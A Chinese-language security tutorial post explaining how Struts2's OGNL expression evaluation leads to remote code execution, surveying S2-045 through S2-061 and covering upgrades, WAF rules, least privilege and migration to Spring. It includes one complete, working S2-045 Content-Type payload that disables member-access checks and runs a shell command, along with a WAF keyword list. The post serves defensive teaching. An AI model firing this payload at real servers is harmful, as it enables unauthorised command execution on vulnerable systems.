---
title: Struts2 与 OGNL：请求参数里写表达式就能 RCE
description: 拆解 Struts2 为何漏洞频发——OGNL 表达式引擎把用户输入当代码求值。从 S2-045 到 S2-061 的利用面（参数、Content-Type、namespace），讲清沙箱绕过思路与升级/WAF 防御。
category: security
subcategory: java-eco
tags: ['Struts2', 'OGNL', 'S2-045', 'S2-061', 'RCE']
pubDate: 2026-07-19
order: 5
---

如果你维护过十年前的 Java Web 项目，大概率见过 `Struts2`。它曾是事实标准，也是**Java 生态里 CVE 数量最多的框架**之一。原因很集中：它用 `OGNL`（Object Graph Navigation Language）表达式引擎处理请求，而早期版本对"用户输入能不能进表达式"管得太松。

这一篇讲清楚 OGNL 为什么会变成 RCE 入口，以及 S2 系列里几个代表性漏洞。

> 本文仅用于授权靶场与防御研究。对他人系统利用下述漏洞属违法。

## OGNL 是什么：能导航、能调用

OGNL 是一种表达式语言，能力比普通取值强得多：它不仅能读对象属性（`user.name`），还能**调用方法、访问静态成员、执行构造**。

```text
# 在 Struts2 的 OGNL 上下文里，这些都能写：
user.name                 // 取属性
@java.lang.Runtime@getRuntime().exec('cmd')   // 调静态方法 + 执行命令
```

Struts2 用 OGNL 把 HTTP 参数绑定到 Action 的属性（`?name=xxx` → `user.name`）。问题就在这：如果框架在"求值"之前没把用户输入和"表达式"严格分开，攻击者就能在参数值里塞进 OGNL 表达式，框架照单全收地执行。

## 经典漏洞一：S2-045 / S2-046（CVE-2017-5638）

这是最出圈的一个。Struts2 在处理文件上传时，会解析请求的 `Content-Type` 头；而旧版在报错信息构造里**用 OGNL 求值了 Content-Type 的内容**。于是攻击者把表达式写进 `Content-Type`：

```http
POST /upload HTTP/1.1
Host: target
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}
```

这段 payload 的套路是：先通过 OGNL 把 Struts2 的**成员访问限制（`memberAccess`）清空**（拿到执行权限），再 `ProcessBuilder` 起一个命令。由于 `Content-Type` 是攻击者完全可控的请求头，连"参数"都不用构造，直接打 Header 即可。S2-046 是同一根的变体（通过文件名而非 Content-Type 触发）。

## 经典漏洞二：S2-057 / S2-061（CVE-2020-17530）

S2-057 出在 `alwaysSelectFullNamespace` 为 true 时，URL 的 `namespace` 会被 OGNL 求值。S2-061 则是 OGNL 沙箱被绕过的后续：Struts2 曾在 S2-057 后加了 OGNL 沙箱（限制能调用的方法），但攻击者又找到绕过方式，重新拿到 `Runtime.exec`。

```text
# S2-061 思路（示意，非完整可用 payload）：
# 通过 OGNL 表达式链，先绕过沙箱限制，再调用表达式执行命令
# 关键在 Struts2 对表达式的"二次求值"没有彻底清理
```

这类漏洞的共性：**框架内部对某些字段做了"再求值"，而沙箱规则有缝隙**。官方每修一次，社区就找一次缝。

## 为什么 Struts2 这么难根治

- **OGNL 太强大**：它本职就是"执行表达式"，要在"绑定参数"和"执行代码"之间画线，本就难。
- **历史包袱**：大量老系统跑着不再维护的 Struts2 版本，升级牵一发动全身。
- **二次求值**：很多 S2 漏洞来自"先解析一次、再解析一次"的连锁，修复容易漏掉某一环。

## 防御：升级是主旋律，WAF 是兜底

- **升级到最新 Struts2**：官方对每个 S2 漏洞都发了修复版本，**跟版本**是最有效的办法。老项目至少升到官方支持的最后一个 2.5.x / 6.x。
- **关掉不必要的功能**：不用文件上传就别引相关 interceptor；不需要 `dynamic method invocation` 就关掉。
- **WAF 拦截**：对 `Content-Type`、`namespace`、参数里出现 `#`、`@`、`_memberAccess`、`OgnlContext`、`ProcessBuilder` 等特征做规则拦截（注意各种编码/嵌套变形）。
- **最小权限运行**：即使被 RCE，应用账号没有提权、没有出网，危害也能被压住。
- **考虑迁移**：新项目优先 Spring MVC / Spring Boot，避开 OGNL 这个历史包袱。

## S2 漏洞不完全清单

Struts2 的 CVE 多到能列一长串，这里挑有代表性的，感受它的"重灾区"分布：

- **S2-016 / S2-017**：`redirect` / `redirectAction` 的 `action:`、`redirect:` 前缀导致 OGNL 执行与任意跳转。
- **S2-045 / S2-046（CVE-2017-5638 / 5639）**：文件上传的 `Content-Type` / 文件名被 OGNL 求值。
- **S2-048**：`Struts2 Struts1 plugin` 把用户输入拼进 OGNL 再求值。
- **S2-052**：REST 插件用 `XStream` 反序列化，接反序列化链。
- **S2-057（CVE-2018-11776）**：`alwaysSelectFullNamespace` 时 `namespace` 被 OGNL 求值。
- **S2-059 / S2-061（CVE-2020-17530）**：OGNL 沙箱被绕过，重新拿 RCE。

你会发现它们根因高度一致：**框架把"本应只是数据"的字段（Header、namespace、参数名）当成了 OGNL 表达式去求值**。修一个、漏一个，本质问题没变。

## 怎么判断我的系统有没有中招

- **确认是否用 Struts2**：依赖树搜 `struts2-core`，看版本。
- **看是否暴露相关入口**：文件上传接口、可被控制 `namespace` 的 action、REST 插件。
- **用扫描器自检**：`wpscan`/`nessus`/各类 S2 专项 poc 在**授权靶场**验证（切勿打未授权系统）。
- **看补丁版本**：对照官方安全公告，确认版本是否已修复对应 S2 编号。

## 防御进阶：WAF 规则怎么写（思路）

WAF 是升级之外的兜底。针对 OGNL 注入，规则要覆盖"表达式里才会出现、正常业务参数不会有的"特征：

- 请求头/参数里出现 `#`（OGNL 上下文引用）、`@`（静态成员/类引用）、`_memberAccess`、`OgnlContext`、`ProcessBuilder`、`getRuntime`、`java.lang.Runtime`。
- 出现 `(` `)` 嵌套且伴随上述关键字（正常业务参数极少同时含 `@` 和 `(`）。
- `Content-Type` / `namespace` 里出现非法的 OGNL 语法字符。

注意：攻击者会用编码（`%00`、`\u0023` 表示 `#`）、换行、分块绕过简单字符串匹配，所以规则要结合**解码后**再匹配，并配合"异常行为"策略（如同一 IP 短时间高频探测不同 S2 payload）。WAF 永远只是争取时间，**升级才是终局**。

## 为什么 Struts2 比现代框架坑多（设计对比）

同样是 Java Web 框架，Spring MVC 的漏洞数量和严重程度明显低于 Struts2，根因在架构哲学：

- **OGNL 太"全能"**：Struts2 把"表达式求值"深度嵌入请求处理，表达式能力过强且历史上默认放开；Spring MVC 用更克制的绑定机制，且 SpEL 默认只用于配置而非请求处理。
- **历史包袱重**：Struts2 继承自 Struts1/XWork，大量老代码和老 interceptor 链，修一个漏一个。
- **二次求值**：Struts2 多处"先解析再解析"的连锁，是 S2-061 这类沙箱绕过反复出现的原因。

所以新项目选型时，**Spring MVC / Spring Boot 是更省心的安全默认**；维护老 Struts2 项目则要把"跟版本 + WAF + 最小权限"当成长期功课。

## 如果必须继续用 Struts2：最小暴露原则

现实里很多老系统短期内无法迁移 Spring。若你不得不继续维护 Struts2，按"最小暴露"原则把风险压到最低：

- **跟到最新支持版**：升到官方仍在维护的 2.5.x 或 6.x 最新补丁，订阅 Struts 安全公告，CVE 一出立刻跟。
- **关掉非必要能力**：生产关 `devMode`；关 `dynamic method invocation`（`struts.enable.DynamicMethodInvocation=false`）；开 `strict-method-invocation` 限制可调用的 action 方法。
- **删多余插件**：移除不用的 `struts2-rest-plugin`、`struts2-struts1-plugin` 等——它们正是多个 S2 漏洞的载体。
- **缩小攻击面**：用 `allowedMethods` / 白名单限制 action 访问；不必要的 action 不暴露路由。
- **网络隔离 + WAF**：Struts2 应用尽量只在内网，前面加 WAF 拦 OGNL 特征；出网限制。
- **定迁移计划**：把"迁到 Spring MVC / Spring Boot"写进路线图，逐步替换，别无限期拖着。

这些动作不能让你"绝对安全"，但能把被利用的概率和危害显著压低，为迁移争取时间。

## 迁移 Spring 的平滑路线

如果决定从 Struts2 迁到 Spring MVC，不必一步到位重写，可按"绞杀者模式"渐进：

1. **新功能用 Spring**：新接口、新模块直接写 Spring MVC Controller，不再动 Struts2 代码。
2. **加适配层**：用 Spring 的 `Struts1/Struts2` 兼容或反向代理，让老 action 逐步被新 Controller 替代。
3. **逐个替换**：按业务优先级，把高频/高危的 action 先迁，低频的老接口最后处理。
4. **并行运行**：新老框架在同一应用内共存一段时间，用路由把流量切到新实现。
5. **下线 Struts2**：全部迁完后移除 Struts2 依赖，彻底关掉 OGNL 这个攻击面。

这样既能享受 Spring 更安全默认的好处，又不会因"大重写"拖垮业务。

## 常见误区

- **"我们没用文件上传就没 S2-045"**：S2-046 走文件名、S2-057 走 namespace，入口不止上传。
- **"升级过一次就一直安全"**：新 S2 漏洞持续披露，必须长期跟版本。
- **"内网 Struts2 不用管"**：内网横向移动和供应链攻击同样利用它，且老系统更难升。

## 自测题

1. 你的项目依赖里 `struts2-core` 版本是多少？官方最新安全版是哪个？
2. S2-045 和 S2-061 虽然都是 OGNL 注入，触发点有什么不同？
3. 为什么说 Struts2 的漏洞"修一个漏一个"？根因是什么？
4. 新项目你会在 Struts2 和 Spring MVC 之间选哪个？为什么？

## 这一篇你该记住的

- Struts2 用 OGNL 处理请求，而 OGNL 能**调用方法、执行命令**；一旦用户输入被当表达式求值，就等价于开了 RCE 口子。
- S2-045（CVE-2017-5638）利用 `Content-Type` 头被 OGNL 求值，清空 `memberAccess` 后 `ProcessBuilder` 起命令。
- S2-057 / S2-061 是 namespace 求值与 OGNL 沙箱被绕过的后续，根因是"二次求值"有缝隙。
- 根治靠**升级到最新 Struts2**；WAF 拦截 OGNL 特征、最小权限运行是兜底；新项目建议迁移 Spring。

下一篇我们转到当下最主流的 **Spring 生态**。它也有自己的"表达式注入"（SpEL）和"数据绑定越权"（Spring4Shell），而且因为无处不在，影响面比 Struts2 更大。